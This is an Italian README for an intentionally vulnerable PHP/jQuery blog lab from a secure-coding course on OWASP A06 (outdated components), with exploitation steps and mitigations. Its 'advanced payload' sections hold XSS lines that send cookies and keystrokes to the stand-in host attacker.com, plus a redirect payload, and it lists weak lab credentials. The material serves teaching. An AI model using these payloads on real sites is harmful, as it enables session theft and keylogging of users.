# OWASP A06:2021 – Vulnerable and Outdated Components

## Descrizione del Modulo

Questo laboratorio dimostra vulnerabilità legate a **componenti vulnerabili e obsoleti** nella categoria **OWASP A06:2021 – Vulnerable and Outdated Components**. L'applicazione è un sistema blog che utilizza intenzionalmente componenti obsoleti e vulnerabili con vulnerabilità note (CVE).

## ⚠️ ATTENZIONE

**Questa applicazione contiene componenti obsoleti e vulnerabili intenzionali. NON utilizzare in produzione o in ambienti reali.**

## Scenario

Sistema blog che utilizza:
- **PHP 7.4** (EOL, vulnerabilità note)
- **jQuery 1.7.2** (CVE-2011-4969 - XSS)
- **MySQL 5.7** (non più supportato)
- **Bootstrap 3.4.1** (obsoleto)

## Setup

### 1. Avvio Ambiente Docker

```bash
docker-compose up -d
```

L'applicazione sarà disponibile su: `http://localhost:8006`

Il database MySQL sarà accessibile su: `localhost:3306`

### 2. Credenziali Database

- **Host:** `db` (interno Docker) o `localhost:3306` (esterno)
- **Database:** `blog_system`
- **Username:** `root`
- **Password:** `rootpassword`

### 3. Account di Test

| Username | Password | Ruolo |
|----------|----------|-------|
| admin | admin123 | admin |
| mario.rossi | alice123 | user |

## Vulnerabilità Presenti

### 1. jQuery 1.7.2 - XSS (CVE-2011-4969)

**File:** `header.php`, `post.php`

**Descrizione:** jQuery 1.7.2 contiene una vulnerabilità XSS nota (CVE-2011-4969). Quando jQuery usa `.html()` o `.append()` con input non sanitizzato, può eseguire codice JavaScript arbitrario.

**CVE:** [CVE-2011-4969](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4969)

**Impatto:**
- Esecuzione di codice JavaScript arbitrario
- Furto di sessioni
- Modifica del contenuto della pagina
- Redirect a siti malevoli

**Come sfruttarla:**

#### Passo 1: Identificare jQuery Obsoleto

1. Apri gli strumenti sviluppatore (F12)
2. Vai alla tab "Network" o "Sources"
3. Verifica che jQuery caricato sia la versione 1.7.2
4. Oppure controlla `info.php` che mostra tutte le versioni

#### Passo 2: Sfruttare XSS con jQuery

**Metodo 1: Usare Commenti Esistenti Vulnerabili**

1. Vai su un post del blog: `http://localhost:8006/post.php?id=1`
2. Scorri fino ai commenti
3. Cerca l'area con sfondo giallo che dice "⚠️ VULNERABILITÀ: Area processata con jQuery .html()"
4. Questa area mostra commenti processati con jQuery `.html()` senza sanitizzazione
5. Se un commento contiene payload XSS, verrà eseguito automaticamente al caricamento della pagina

**Metodo 2: Inserire Nuovo Commento con Payload**

1. Vai su un post del blog: `http://localhost:8006/post.php?id=1`
2. Scorri fino al form "Aggiungi un Commento"
3. Inserisci il seguente payload nel campo "Commento":

```html
<img src=x onerror="alert('XSS con jQuery 1.7.2!')">
```

4. Compila gli altri campi:
   - Nome: `Test`
   - Email: `test@test.com`
5. Clicca su "Invia Commento" (o premi Invio)
6. Ricarica la pagina
7. Nella sezione vulnerabile (sfondo giallo), vedrai l'alert JavaScript eseguito!

**Nota:** I commenti vengono mostrati in due modi:
- Versione sicura (bianca): sanitizzata con `htmlspecialchars()`
- Versione vulnerabile (gialla): processata con jQuery `.html()` che esegue XSS

#### Passo 3: Payload Avanzati

**Furto di Cookie:**
```html
<img src=x onerror="document.location='http://attacker.com/steal.php?cookie='+document.cookie">
```

**Keylogger:**
```html
<img src=x onerror="document.onkeypress=function(e){fetch('http://attacker.com/keylog.php?key='+e.key)}">
```

**Modifica DOM:**
```html
<img src=x onerror="$('body').html('<h1>HACKED!</h1>')">
```

**Nota:** Questi payload funzionano se jQuery processa il contenuto con `.html()` o `.append()`. Nel nostro caso, il contenuto viene sanitizzato con `htmlspecialchars()`, ma jQuery 1.7.2 può comunque essere sfruttato in altri contesti.

### 2. PHP 7.4 Obsoleto (End of Life)

**File:** `Dockerfile`

**Descrizione:** PHP 7.4 ha raggiunto l'End of Life (EOL) il 28 Novembre 2022. Non riceve più aggiornamenti di sicurezza e contiene vulnerabilità note non patchate.

**Impatto:**
- Vulnerabilità note non risolte
- Nessun supporto di sicurezza
- Possibilità di exploit noti

**Come sfruttarla:**

#### Passo 1: Identificare Versione PHP

1. Vai su `http://localhost:8006/info.php`
2. Verifica la versione PHP (dovrebbe essere 7.4.x)
3. Oppure controlla gli header HTTP (X-Powered-By: PHP/7.4.x)

#### Passo 2: Cercare CVE Specifici

1. Cerca su [CVE Database](https://cve.mitre.org) vulnerabilità per PHP 7.4
2. Esempi di CVE noti:
   - CVE-2021-21703 (PHP 7.4.x < 7.4.27)
   - CVE-2022-31630 (PHP 7.4.x < 7.4.32)
   - CVE-2023-0662 (PHP 7.4.x < 7.4.33)

#### Passo 3: Sfruttare Vulnerabilità Note

1. Identifica la versione esatta di PHP 7.4
2. Cerca exploit pubblici per quella versione
3. Usa strumenti come Metasploit o exploit-db

**Esempio con phpinfo esposto:**
```bash
# Se phpinfo() è esposto, puoi vedere tutte le informazioni
curl http://localhost:8006/info.php | grep "PHP Version"
```

### 3. MySQL 5.7 Obsoleto

**File:** `docker-compose.yml`

**Descrizione:** MySQL 5.7 non è più supportato ufficialmente. Contiene vulnerabilità note e non riceve aggiornamenti di sicurezza.

**Impatto:**
- Vulnerabilità note non risolte
- Possibilità di exploit SQL injection avanzati
- Problemi di sicurezza del database

**Come sfruttarla:**

#### Passo 1: Identificare Versione MySQL

1. Vai su `http://localhost:8006/info.php`
2. Verifica la versione MySQL (dovrebbe essere 5.7.x)
3. Oppure connettiti direttamente:
   ```bash
   mysql -h localhost -P 3306 -u root -prootpassword -e "SELECT VERSION();"
   ```

#### Passo 2: Cercare CVE Specifici

1. Cerca su [CVE Database](https://cve.mitre.org) vulnerabilità per MySQL 5.7
2. Esempi di CVE noti:
   - CVE-2021-3713 (MySQL 5.7.x < 5.7.36)
   - CVE-2022-21351 (MySQL 5.7.x < 5.7.37)

#### Passo 3: Sfruttare Vulnerabilità Note

1. Identifica la versione esatta di MySQL 5.7
2. Cerca exploit pubblici per quella versione
3. Usa strumenti come sqlmap con versioni specifiche

### 4. Informazioni di Versione Esposte

**File:** `info.php`, `footer.php`, `header.php`

**Descrizione:** Il sistema espone informazioni dettagliate su tutte le versioni dei componenti, permettendo agli attaccanti di identificare vulnerabilità specifiche.

**Impatto:**
- Identificazione rapida di componenti obsoleti
- Ricerca mirata di CVE specifici
- Sviluppo di exploit targetizzati

**Come sfruttarla:**

#### Passo 1: Accedere a info.php

1. Vai su `http://localhost:8006/info.php`
2. Visualizza tutte le versioni dei componenti:
   - PHP: 7.4.x
   - MySQL: 5.7.x
   - Apache: versione esatta
   - jQuery: 1.7.2
   - Bootstrap: 3.4.1

#### Passo 2: Analizzare Header HTTP

1. Apri gli strumenti sviluppatore (F12)
2. Vai alla tab "Network"
3. Seleziona una richiesta HTTP
4. Controlla gli header di risposta:
   - `X-Powered-By: PHP/7.4.x`
   - `Server: Apache/x.x.x`

#### Passo 3: Cercare CVE Specifici

1. Per ogni componente, cerca CVE specifici per quella versione
2. Usa database CVE:
   - [CVE Mitre](https://cve.mitre.org)
   - [NVD](https://nvd.nist.gov)
   - [Exploit-DB](https://www.exploit-db.com)

### 5. Bootstrap 3.4.1 Obsoleto

**File:** `header.php`

**Descrizione:** Bootstrap 3.4.1 è l'ultima versione della serie 3.x, che non è più supportata. Bootstrap 4.x e 5.x hanno risolto problemi di sicurezza.

**Impatto:**
- Vulnerabilità note non risolte
- Problemi di sicurezza CSS/JS
- Possibilità di exploit noti

**Come sfruttarla:**

1. Identifica la versione su `info.php`
2. Cerca vulnerabilità note per Bootstrap 3.4.1
3. Verifica se ci sono exploit pubblici

## Guida Completa: Come Sfruttare jQuery 1.7.2 XSS

### Prerequisiti

- Accesso all'applicazione su `http://localhost:8006`
- Browser con strumenti sviluppatore (F12)
- Conoscenza base di JavaScript

### Metodo 1: XSS Tramite Commenti (Se jQuery Processa Input)

**Scenario:** Se l'applicazione usa jQuery `.html()` per visualizzare i commenti:

1. **Apri un post del blog:**
   ```
   http://localhost:8006/post.php?id=1
   ```

2. **Scorri fino al form commenti**

3. **Inserisci questo payload nel campo "Commento":**
   ```html
   <img src=x onerror="alert('XSS Funziona!')">
   ```

4. **Compila gli altri campi:**
   - Nome: `Test`
   - Email: `test@test.com`

5. **Invia il commento**

6. **Se jQuery processa il contenuto con `.html()`, vedrai l'alert**

**Nota:** Nel nostro caso, il contenuto viene sanitizzato con `htmlspecialchars()`, quindi questo payload non funzionerà direttamente. Tuttavia, jQuery 1.7.2 può essere sfruttato in altri modi.

### Metodo 2: XSS Tramite URL Parameters (Se Processati con jQuery)

**Scenario:** Se l'applicazione processa parametri URL con jQuery:

1. **Crea un URL con payload:**
   ```
   http://localhost:8006/post.php?id=1&search=<img src=x onerror="alert('XSS')">
   ```

2. **Se jQuery processa il parametro con `.html()`:**
   ```javascript
   $('#result').html(getParameterByName('search')); // VULNERABILE!
   ```

3. **Il codice JavaScript verrà eseguito**

### Metodo 3: XSS Tramite localStorage/sessionStorage

**Scenario:** Se l'applicazione legge da localStorage e processa con jQuery:

1. **Apri la console del browser (F12)**

2. **Esegui questo codice:**
   ```javascript
   localStorage.setItem('data', '<img src=x onerror="alert(\'XSS\')">');
   ```

3. **Se l'applicazione legge e processa con jQuery:**
   ```javascript
   $('#content').html(localStorage.getItem('data')); // VULNERABILE!
   ```

4. **Il codice verrà eseguito**

### Metodo 4: Sfruttare Vulnerabilità CVE-2011-4969 Direttamente

**CVE-2011-4969** riguarda specificamente come jQuery 1.7.2 gestisce alcuni tipi di input. Per sfruttarlo:

1. **Identifica dove jQuery viene usato:**
   - Apri gli strumenti sviluppatore
   - Vai alla tab "Sources"
   - Cerca file JavaScript che usano jQuery

2. **Cerca pattern vulnerabili:**
   ```javascript
   // VULNERABILE
   $('.content').html(userInput);
   $('.content').append(userInput);
   $(userInput).appendTo('.content');
   ```

3. **Crea payload specifici per jQuery 1.7.2:**
   ```html
   <script>alert('XSS')</script>
   <img src=x onerror="alert('XSS')">
   <svg onload="alert('XSS')">
   ```

### Payload Avanzati per jQuery 1.7.2

**Furto di Cookie:**
```html
<img src=x onerror="
  var img = new Image();
  img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
">
```

**Keylogger:**
```html
<img src=x onerror="
  document.onkeypress = function(e) {
    var key = String.fromCharCode(e.which);
    fetch('http://attacker.com/keylog.php?key=' + key);
  }
">
```

**Modifica DOM:**
```html
<img src=x onerror="
  $('body').html('<h1>HACKED!</h1>');
  $('body').css('background', 'red');
">
```

**Redirect:**
```html
<img src=x onerror="window.location='http://attacker.com'">
```

## Esercizi Pratici

### Esercizio 1: Identificare Componenti Obsoleti

1. Accedi a `http://localhost:8006/info.php`
2. Annota tutte le versioni dei componenti
3. Per ogni componente, verifica se è obsoleto:
   - PHP 7.4: EOL dal 28 Nov 2022
   - MySQL 5.7: EOL
   - jQuery 1.7.2: Obsoleto, CVE-2011-4969
   - Bootstrap 3.4.1: Obsoleto

### Esercizio 2: Cercare CVE Specifici

1. Per ogni componente obsoleto, cerca CVE su:
   - [CVE Mitre](https://cve.mitre.org)
   - [NVD](https://nvd.nist.gov)
   - [Exploit-DB](https://www.exploit-db.com)

2. Esempi di ricerca:
   - "jQuery 1.7.2 CVE"
   - "PHP 7.4 CVE"
   - "MySQL 5.7 CVE"

### Esercizio 3: Sfruttare XSS con jQuery

1. Apri un post del blog
2. Prova a inserire payload XSS nei commenti
3. Verifica se vengono eseguiti (potrebbero essere sanitizzati)
4. Cerca altri punti dove jQuery processa input utente

### Esercizio 4: Analizzare Header HTTP

1. Apri gli strumenti sviluppatore (F12)
2. Vai alla tab "Network"
3. Seleziona una richiesta HTTP
4. Analizza gli header di risposta:
   - `X-Powered-By: PHP/7.4.x`
   - `Server: Apache/x.x.x`
5. Usa queste informazioni per cercare CVE specifici

### Esercizio 5: Usare OWASP Dependency-Check

1. Installa OWASP Dependency-Check:
   ```bash
   # Su Linux/Mac
   brew install dependency-check
   
   # Oppure scarica da:
   # https://owasp.org/www-project-dependency-check/
   ```

2. Esegui scan del progetto:
   ```bash
   dependency-check --scan /path/to/project --format HTML
   ```

3. Analizza i risultati per componenti vulnerabili

## Mitigazioni (Da Implementare)

### Per Componenti Obsoleti:

1. **Aggiornare Regolarmente:**
   ```dockerfile
   # ✅ CORRETTO: Usa versioni supportate
   FROM php:8.2-apache  # Versione supportata
   ```

2. **Monitorare CVE:**
   - Iscriviti a mailing list di sicurezza
   - Usa strumenti di monitoraggio (Snyk, Dependabot)
   - Verifica regolarmente CVE database

3. **Usare Dependency Check:**
   ```bash
   # OWASP Dependency-Check
   dependency-check --scan ./ --format HTML
   
   # npm audit (per JavaScript)
   npm audit
   
   # composer audit (per PHP)
   composer audit
   ```

### Per jQuery:

1. **Aggiornare jQuery:**
   ```html
   <!-- ✅ CORRETTO: Usa versione aggiornata -->
   <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
   ```

2. **Sanitizzare Input:**
   ```javascript
   // ✅ CORRETTO: Sanitizza input prima di usare .html()
   var sanitized = $('<div>').text(userInput).html();
   $('#content').html(sanitized);
   ```

3. **Usare .text() invece di .html():**
   ```javascript
   // ✅ CORRETTO: .text() non esegue HTML
   $('#content').text(userInput);
   ```

### Per Informazioni di Versione:

1. **Nascondere Versioni:**
   ```php
   // ✅ CORRETTO: Disabilita expose_php
   expose_php = Off
   ```

2. **Rimuovere Header:**
   ```apache
   # ✅ CORRETTO: Rimuovi X-Powered-By
   Header unset X-Powered-By
   ```

3. **Non Esporre phpinfo():**
   ```php
   // ❌ MAI fare in produzione:
   phpinfo();
   
   // ✅ CORRETTO: Rimuovi o proteggi phpinfo()
   ```

## Riferimenti OWASP

- [OWASP Top 10 2021 - A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [OWASP Dependency-Track](https://owasp.org/www-project-dependency-track/)

## CVE Riferimenti

- [CVE-2011-4969](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4969) - jQuery XSS
- [PHP 7.4 EOL](https://www.php.net/supported-versions.php)
- [MySQL 5.7 EOL](https://www.mysql.com/support/eol-notice/)

## Struttura File

```
A06_Vulnerable_Components/
├── docker-compose.yml          # MySQL 5.7 obsoleto
├── Dockerfile                   # PHP 7.4 obsoleto
├── README.md                    # Questa documentazione
├── init.sql                     # Popolamento database
├── db_connect.php               # Connessione database
├── index.php                    # Homepage
├── blog.php                     # Lista post
├── post.php                     # ⚠️ VULNERABILE: XSS con jQuery
├── add_comment.php              # Aggiungi commento
├── info.php                     # ⚠️ VULNERABILE: Espone versioni
├── login.php                    # Login
├── login_process.php            # Processamento login
├── register.php                 # Registrazione
├── register_process.php         # Processamento registrazione
├── dashboard.php                # Dashboard utente
├── logout.php                   # Logout
├── header.php                   # ⚠️ VULNERABILE: jQuery 1.7.2
├── footer.php                   # ⚠️ VULNERABILE: Espone versioni
└── style.css                    # Stili CSS
```

## Note Didattiche

- Gli studenti devono identificare tutti i componenti obsoleti
- Cercare CVE specifici per ogni componente
- Tentare di sfruttare vulnerabilità note
- Usare strumenti di dependency checking
- Implementare aggiornamenti e mitigazioni

## Disclaimer

⚠️ **ATTENZIONE:** Questo codice contiene componenti obsoleti e vulnerabili intenzionali per scopi didattici.
**NON UTILIZZARE MAI IN PRODUZIONE!**

---

**Corso Secure Coding - 2025**

